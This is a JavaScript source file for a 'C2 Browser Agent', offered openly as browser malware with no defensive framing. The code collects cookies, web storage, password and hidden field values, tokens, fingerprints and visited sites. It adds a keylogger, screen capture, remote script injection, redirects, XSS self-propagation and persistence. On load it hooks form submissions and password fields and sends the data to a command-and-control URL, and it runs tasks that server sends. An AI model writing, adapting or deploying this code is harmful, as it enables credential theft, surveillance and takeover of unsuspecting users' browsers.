/**
 * C2 Browser Agent - Global Agent Network
 * 
 * Capabilities:
 * - Cookie collection & exfiltration
 * - Browser fingerprinting
 * - Form data capture
 * - History scanning
 * - Service Worker persistence
 * - XSS propagation
 * - Credential harvesting
 * 
 * Distribution:
 * - Browser Extension (Chrome/Firefox)
 * - XSS injection
 * - Service Worker
 * - PWA installation
 */

(function() {
    'use strict';
    
    // ─── Configuration ─────────────────────────────────────────────────────────
    const CONFIG = {
        C2_URL: window.C2_URL || 'https://localhost:5000',
        BEACON_INTERVAL: 30000,  // 30 seconds
        JITTER: 0.2,  // 20% jitter
        AGENT_ID: localStorage.getItem('_agent_id') || generateUUID(),
        ENCRYPTION_KEY: null,
        DEBUG: false,
    };
    
    // Save agent ID
    localStorage.setItem('_agent_id', CONFIG.AGENT_ID);
    
    // ─── Utility Functions ──────────────────────────────────────────────────────
    function generateUUID() {
        return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, c => {
            const r = Math.random() * 16 | 0;
            const v = c === 'x' ? r : (r & 0x3 | 0x8);
            return v.toString(16);
        });
    }
    
    function log(msg, level = 'INFO') {
        if (CONFIG.DEBUG) {
            console.log(`[BrowserAgent:${level}] ${msg}`);
        }
    }
    
    function xorEncrypt(data, key) {
        if (!key) return btoa(data);
        const keyBytes = new TextEncoder().encode(key);
        const dataBytes = new TextEncoder().encode(data);
        const encrypted = dataBytes.map((b, i) => b ^ keyBytes[i % keyBytes.length]);
        return btoa(String.fromCharCode(...encrypted));
    }
    
    function xorDecrypt(data, key) {
        if (!key) return atob(data);
        const keyBytes = new TextEncoder().encode(key);
        const dataBytes = Uint8Array.from(atob(data), c => c.charCodeAt(0));
        const decrypted = dataBytes.map((b, i) => b ^ keyBytes[i % keyBytes.length]);
        return new TextDecoder().decode(decrypted);
    }
    
    // ─── Browser Fingerprinting ────────────────────────────────────────────────
    function collectFingerprint() {
        const fp = {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            languages: navigator.languages?.join(','),
            cookiesEnabled: navigator.cookieEnabled,
            doNotTrack: navigator.doNotTrack,
            hardwareConcurrency: navigator.hardwareConcurrency,
            deviceMemory: navigator.deviceMemory,
            screenWidth: screen.width,
            screenHeight: screen.height,
            colorDepth: screen.colorDepth,
            pixelRatio: window.devicePixelRatio,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            timezoneOffset: new Date().getTimezoneOffset(),
            plugins: Array.from(navigator.plugins || []).map(p => p.name).join(','),
            webdriver: navigator.webdriver,
            vendor: navigator.vendor,
            maxTouchPoints: navigator.maxTouchPoints,
            
            // Canvas fingerprint
            canvasHash: getCanvasFingerprint(),
            
            // WebGL fingerprint
            webglVendor: getWebGLFingerprint().vendor,
            webglRenderer: getWebGLFingerprint().renderer,
            
            // Audio fingerprint
            audioHash: getAudioFingerprint(),
            
            // Font detection
            fonts: detectFonts(),
        };
        
        return fp;
    }
    
    function getCanvasFingerprint() {
        try {
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            ctx.textBaseline = 'top';
            ctx.font = '14px Arial';
            ctx.fillStyle = '#f60';
            ctx.fillRect(125, 1, 62, 20);
            ctx.fillStyle = '#069';
            ctx.fillText('BrowserAgent', 2, 2);
            ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
            ctx.fillText('C2', 4, 17);
            return canvas.toDataURL().slice(-50);
        } catch {
            return 'canvas_blocked';
        }
    }
    
    function getWebGLFingerprint() {
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (!gl) return { vendor: 'none', renderer: 'none' };
            
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            return {
                vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'unknown',
                renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'unknown'
            };
        } catch {
            return { vendor: 'error', renderer: 'error' };
        }
    }
    
    function getAudioFingerprint() {
        try {
            const audioContext = new (window.AudioContext || window.webkitAudioContext)();
            const oscillator = audioContext.createOscillator();
            const analyser = audioContext.createAnalyser();
            const gain = audioContext.createGain();
            const processor = audioContext.createScriptProcessor(4096, 1, 1);
            
            gain.gain.value = 0;
            oscillator.type = 'triangle';
            oscillator.frequency.value = 10000;
            
            oscillator.connect(analyser);
            analyser.connect(processor);
            processor.connect(gain);
            gain.connect(audioContext.destination);
            
            oscillator.start(0);
            
            const fingerprint = [];
            analyser.getByteFrequencyData(fingerprint);
            
            oscillator.stop();
            audioContext.close();
            
            return fingerprint.slice(0, 10).join(',');
        } catch {
            return 'audio_blocked';
        }
    }
    
    function detectFonts() {
        const baseFonts = ['monospace', 'sans-serif', 'serif'];
        const testFonts = [
            'Arial', 'Arial Black', 'Arial Narrow', 'Calibri', 'Cambria',
            'Comic Sans MS', 'Consolas', 'Courier', 'Courier New', 'Georgia',
            'Helvetica', 'Impact', 'Lucida Console', 'Lucida Sans Unicode',
            'Microsoft Sans Serif', 'Palatino Linotype', 'Segoe UI', 'Tahoma',
            'Times', 'Times New Roman', 'Trebuchet MS', 'Verdana'
        ];
        
        const testString = 'mmmmmmmmmmlli';
        const testSize = '72px';
        const h = document.getElementsByTagName('body')[0];
        const span = document.createElement('span');
        span.style.fontSize = testSize;
        span.innerHTML = testString;
        
        const baseFontWidths = {};
        for (const baseFont of baseFonts) {
            span.style.fontFamily = baseFont;
            h.appendChild(span);
            baseFontWidths[baseFont] = span.offsetWidth;
            h.removeChild(span);
        }
        
        const detectedFonts = [];
        for (const font of testFonts) {
            let detected = false;
            for (const baseFont of baseFonts) {
                span.style.fontFamily = `'${font}', ${baseFont}`;
                h.appendChild(span);
                const width = span.offsetWidth;
                h.removeChild(span);
                
                if (width !== baseFontWidths[baseFont]) {
                    detected = true;
                    break;
                }
            }
            if (detected) detectedFonts.push(font);
        }
        
        return detectedFonts.join(',');
    }
    
    // ─── Data Collection ────────────────────────────────────────────────────────
    function collectCookies() {
        const cookies = {};
        
        // HTTP cookies
        if (document.cookie) {
            document.cookie.split(';').forEach(cookie => {
                const [name, value] = cookie.trim().split('=');
                if (name && value) {
                    cookies[name] = value;
                }
            });
        }
        
        // localStorage
        try {
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                if (!key.startsWith('_')) {  // Skip our own keys
                    cookies[`ls_${key}`] = localStorage.getItem(key);
                }
            }
        } catch {}
        
        // sessionStorage
        try {
            for (let i = 0; i < sessionStorage.length; i++) {
                const key = sessionStorage.key(i);
                cookies[`ss_${key}`] = sessionStorage.getItem(key);
            }
        } catch {}
        
        // IndexedDB databases (list names only)
        try {
            if (indexedDB.databases) {
                indexedDB.databases().then(dbs => {
                    dbs.forEach(db => {
                        cookies[`idb_${db.name}`] = 'indexeddb';
                    });
                });
            }
        } catch {}
        
        return cookies;
    }
    
    function collectHistory() {
        // We can't directly access history, but we can detect visited links
        // using the :visited selector timing attack or CSS styling
        const commonSites = [
            'google.com', 'facebook.com', 'youtube.com', 'amazon.com',
            'twitter.com', 'linkedin.com', 'github.com', 'reddit.com',
            'instagram.com', 'netflix.com', 'gmail.com', 'outlook.com',
            'bankofamerica.com', 'chase.com', 'wellsfargo.com', 'paypal.com',
        ];
        
        const visited = [];
        const link = document.createElement('a');
        link.style.cssText = 'position:absolute;left:-9999px;';
        
        for (const site of commonSites) {
            link.href = `https://${site}`;
            document.body.appendChild(link);
            
            // Check computed style (visited links have different color)
            const color = getComputedStyle(link).color;
            if (color === 'rgb(85, 26, 139)' || color === 'purple') {
                visited.push(site);
            }
            
            document.body.removeChild(link);
        }
        
        return visited;
    }
    
    function collectFormData() {
        const formData = [];
        
        // Capture all input fields
        document.querySelectorAll('input, textarea, select').forEach(el => {
            if (el.type === 'password' || el.type === 'hidden') {
                formData.push({
                    type: el.type,
                    name: el.name || el.id,
                    value: el.value,
                    form: el.form?.action || window.location.href
                });
            }
        });
        
        return formData;
    }
    
    function collectCredentials() {
        const credentials = [];
        
        // Check for saved passwords (requires user interaction)
        // This is limited by browser security
        
        // Check for API keys in localStorage/sessionStorage
        const storageKeys = ['api_key', 'apikey', 'token', 'auth', 'secret', 'password', 'credential'];
        
        for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i).toLowerCase();
            const value = localStorage.getItem(localStorage.key(i));
            
            if (storageKeys.some(sk => key.includes(sk))) {
                credentials.push({
                    source: 'localStorage',
                    key: localStorage.key(i),
                    value: value?.substring(0, 100)
                });
            }
        }
        
        // Check URL for tokens
        const urlParams = new URLSearchParams(window.location.search);
        for (const [key, value] of urlParams) {
            if (storageKeys.some(sk => key.toLowerCase().includes(sk))) {
                credentials.push({
                    source: 'url',
                    key: key,
                    value: value?.substring(0, 100)
                });
            }
        }
        
        return credentials;
    }
    
    function collectAllData() {
        return {
            timestamp: new Date().toISOString(),
            agentId: CONFIG.AGENT_ID,
            url: window.location.href,
            referrer: document.referrer,
            fingerprint: collectFingerprint(),
            cookies: collectCookies(),
            history: collectHistory(),
            formData: collectFormData(),
            credentials: collectCredentials(),
            localStorage: { ...localStorage },
            sessionStorage: { ...sessionStorage },
        };
    }
    
    // ─── Communication ──────────────────────────────────────────────────────────
    function beacon() {
        const data = collectAllData();
        const payload = xorEncrypt(JSON.stringify(data), CONFIG.ENCRYPTION_KEY);
        
        // Try multiple communication methods
        const methods = [
            beaconFetch,
            beaconImage,
            beaconBeacon,
            beaconWebSocket,
        ];
        
        for (const method of methods) {
            try {
                method(payload);
                log(`Beacon sent via ${method.name}`);
                return true;
            } catch (e) {
                log(`Method ${method.name} failed: ${e}`, 'WARN');
            }
        }
        
        return false;
    }
    
    function beaconFetch(payload) {
        return fetch(`${CONFIG.C2_URL}/api/agent/browser/beacon`, {
            method: 'POST',
            headers: {
                'Content-Type': 'text/plain',
                'X-Agent-Id': CONFIG.AGENT_ID,
            },
            body: payload,
            mode: 'no-cors',
            credentials: 'include',
        });
    }
    
    function beaconImage(payload) {
        return new Promise((resolve, reject) => {
            const img = new Image();
            img.onload = resolve;
            img.onerror = reject;
            img.src = `${CONFIG.C2_URL}/api/agent/browser/beacon?d=${encodeURIComponent(payload.substring(0, 1000))}`;
        });
    }
    
    function beaconBeacon(payload) {
        if (navigator.sendBeacon) {
            const blob = new Blob([payload], { type: 'text/plain' });
            return navigator.sendBeacon(`${CONFIG.C2_URL}/api/agent/browser/beacon`, blob);
        }
        throw new Error('sendBeacon not supported');
    }
    
    function beaconWebSocket(payload) {
        return new Promise((resolve, reject) => {
            const ws = new WebSocket(`${CONFIG.C2_URL.replace('http', 'ws')}/ws/agent`);
            ws.onopen = () => {
                ws.send(JSON.stringify({
                    type: 'beacon',
                    agentId: CONFIG.AGENT_ID,
                    payload: payload
                }));
                ws.close();
                resolve();
            };
            ws.onerror = reject;
        });
    }
    
    // ─── Task Execution ─────────────────────────────────────────────────────────
    async function getTasks() {
        try {
            const response = await fetch(`${CONFIG.C2_URL}/api/agent/browser/tasks`, {
                headers: { 'X-Agent-Id': CONFIG.AGENT_ID }
            });
            return await response.json();
        } catch {
            return [];
        }
    }
    
    async function executeTask(task) {
        const result = { taskId: task.id, status: 'completed', result: null };
        
        try {
            switch (task.type) {
                case 'collect':
                    result.result = collectAllData();
                    break;
                    
                case 'cookies':
                    result.result = collectCookies();
                    break;
                    
                case 'credentials':
                    result.result = collectCredentials();
                    break;
                    
                case 'fingerprint':
                    result.result = collectFingerprint();
                    break;
                    
                case 'screenshot':
                    result.result = await takeScreenshot();
                    break;
                    
                case 'keylog_start':
                    startKeylogger();
                    result.result = 'Keylogger started';
                    break;
                    
                case 'keylog_stop':
                    result.result = stopKeylogger();
                    break;
                    
                case 'keylog_data':
                    result.result = getKeyloggerData();
                    break;
                    
                case 'inject':
                    result.result = injectScript(task.payload);
                    break;
                    
                case 'redirect':
                    window.location.href = task.payload;
                    result.result = 'Redirecting...';
                    break;
                    
                case 'form_fill':
                    result.result = fillForm(task.payload);
                    break;
                    
                case 'click':
                    result.result = clickElement(task.payload);
                    break;
                    
                case 'xss_propagate':
                    result.result = xssPropagate(task.payload);
                    break;
                    
                case 'exfil':
                    result.result = await exfiltrate(task.payload);
                    break;
                    
                case 'persist':
                    result.result = installPersistence();
                    break;
                    
                default:
                    result.status = 'failed';
                    result.result = `Unknown task type: ${task.type}`;
            }
        } catch (e) {
            result.status = 'failed';
            result.result = e.message;
        }
        
        return result;
    }
    
    async function reportResult(result) {
        try {
            await fetch(`${CONFIG.C2_URL}/api/agent/browser/result`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'X-Agent-Id': CONFIG.AGENT_ID,
                },
                body: JSON.stringify(result)
            });
        } catch (e) {
            log(`Failed to report result: ${e}`, 'ERROR');
        }
    }
    
    // ─── Special Capabilities ────────────────────────────────────────────────────
    async function takeScreenshot() {
        try {
            // Use html2canvas or native API
            if ('getDisplayMedia' in navigator.mediaDevices) {
                const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
                const video = document.createElement('video');
                video.srcObject = stream;
                await video.play();
                
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                
                stream.getTracks().forEach(t => t.stop());
                
                return canvas.toDataURL('image/png').substring(0, 1000) + '...';
            }
            return 'Screenshot requires user permission';
        } catch (e) {
            return `Screenshot failed: ${e.message}`;
        }
    }
    
    // Keylogger
    let keylogData = [];
    let keylogActive = false;
    
    function startKeylogger() {
        if (keylogActive) return;
        keylogActive = true;
        
        document.addEventListener('keydown', keylogHandler);
        document.addEventListener('input', inputHandler);
    }
    
    function stopKeylogger() {
        keylogActive = false;
        document.removeEventListener('keydown', keylogHandler);
        document.removeEventListener('input', inputHandler);
        return getKeyloggerData();
    }
    
    function keylogHandler(e) {
        keylogData.push({
            type: 'keydown',
            key: e.key,
            target: e.target?.tagName,
            timestamp: Date.now()
        });
    }
    
    function inputHandler(e) {
        if (e.target?.type === 'password') return;  // Don't log passwords directly
        
        keylogData.push({
            type: 'input',
            value: e.target?.value?.substring(0, 100),
            target: e.target?.name || e.target?.id,
            timestamp: Date.now()
        });
    }
    
    function getKeyloggerData() {
        const data = [...keylogData];
        keylogData = [];
        return data;
    }
    
    function injectScript(code) {
        try {
            const script = document.createElement('script');
            script.textContent = code;
            document.body.appendChild(script);
            return 'Script injected';
        } catch (e) {
            return `Injection failed: ${e.message}`;
        }
    }
    
    function fillForm(data) {
        try {
            const parsed = JSON.parse(data);
            for (const [selector, value] of Object.entries(parsed)) {
                const el = document.querySelector(selector);
                if (el) {
                    el.value = value;
                    el.dispatchEvent(new Event('input', { bubbles: true }));
                }
            }
            return 'Form filled';
        } catch (e) {
            return `Form fill failed: ${e.message}`;
        }
    }
    
    function clickElement(selector) {
        try {
            const el = document.querySelector(selector);
            if (el) {
                el.click();
                return `Clicked: ${selector}`;
            }
            return `Element not found: ${selector}`;
        } catch (e) {
            return `Click failed: ${e.message}`;
        }
    }
    
    function xssPropagate(targetUrl) {
        // Generate XSS payload that injects this agent
        const agentScript = document.currentScript?.src || '';
        const payload = `<script src="${agentScript}"></script>`;
        
        // Try to inject into target
        if (targetUrl) {
            // For stored XSS, we'd need to send this to the target
            return { payload, targetUrl };
        }
        
        return { payload };
    }
    
    async function exfiltrate(data) {
        try {
            const response = await fetch(`${CONFIG.C2_URL}/api/agent/browser/exfil`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'X-Agent-Id': CONFIG.AGENT_ID,
                },
                body: JSON.stringify({ data })
            });
            return await response.json();
        } catch (e) {
            return `Exfiltration failed: ${e.message}`;
        }
    }
    
    // ─── Persistence ────────────────────────────────────────────────────────────
    function installPersistence() {
        const methods = [];
        
        // 1. Service Worker
        if ('serviceWorker' in navigator) {
            try {
                // We'd need to register a malicious service worker
                // This requires HTTPS and same-origin
                methods.push('serviceWorker_available');
            } catch {}
        }
        
        // 2. localStorage (already done for agent ID)
        methods.push('localStorage');
        
        // 3. IndexedDB
        if ('indexedDB' in window) {
            try {
                const request = indexedDB.open('_agent_db', 1);
                request.onupgradeneeded = (e) => {
                    const db = e.target.result;
                    db.createObjectStore('data');
                };
                methods.push('indexedDB');
            } catch {}
        }
        
        // 4. Cache API
        if ('caches' in window) {
            try {
                caches.open('_agent_cache').then(cache => {
                    cache.add(`${CONFIG.C2_URL}/static/js/agent_browser.js`);
                });
                methods.push('cache_api');
            } catch {}
        }
        
        return { installed: methods };
    }
    
    // ─── Main Loop ──────────────────────────────────────────────────────────────
    async function mainLoop() {
        log('Browser Agent starting...');
        
        // Initial beacon
        await beacon();
        
        // Main loop
        setInterval(async () => {
            // Add jitter
            const jitter = CONFIG.BEACON_INTERVAL * CONFIG.JITTER * Math.random();
            await new Promise(r => setTimeout(r, jitter));
            
            // Beacon
            await beacon();
            
            // Get and execute tasks
            const tasks = await getTasks();
            for (const task of tasks) {
                const result = await executeTask(task);
                await reportResult(result);
            }
        }, CONFIG.BEACON_INTERVAL);
    }
    
    // ─── Initialization ──────────────────────────────────────────────────────────
    function init() {
        // Check if already running
        if (window._browserAgentRunning) return;
        window._browserAgentRunning = true;
        
        // Start main loop
        if (document.readyState === 'complete') {
            mainLoop();
        } else {
            window.addEventListener('load', mainLoop);
        }
        
        // Install persistence
        installPersistence();
        
        // Form submission hook
        document.addEventListener('submit', (e) => {
            const formData = new FormData(e.target);
            const data = {};
            formData.forEach((v, k) => data[k] = v);
            
            // Exfiltrate form data
            exfiltrate({
                type: 'form_submit',
                action: e.target.action,
                method: e.target.method,
                data: data
            });
        }, true);
        
        // Password field monitoring
        document.querySelectorAll('input[type="password"]').forEach(input => {
            input.addEventListener('change', (e) => {
                exfiltrate({
                    type: 'password_change',
                    form: e.target.form?.action,
                    name: e.target.name,
                    value: e.target.value
                });
            });
        });
    }
    
    // Start
    init();
    
    // Export for debugging
    window.BrowserAgent = {
        collect: collectAllData,
        beacon: beacon,
        getTasks: getTasks,
        executeTask: executeTask,
        config: CONFIG,
    };
    
})();
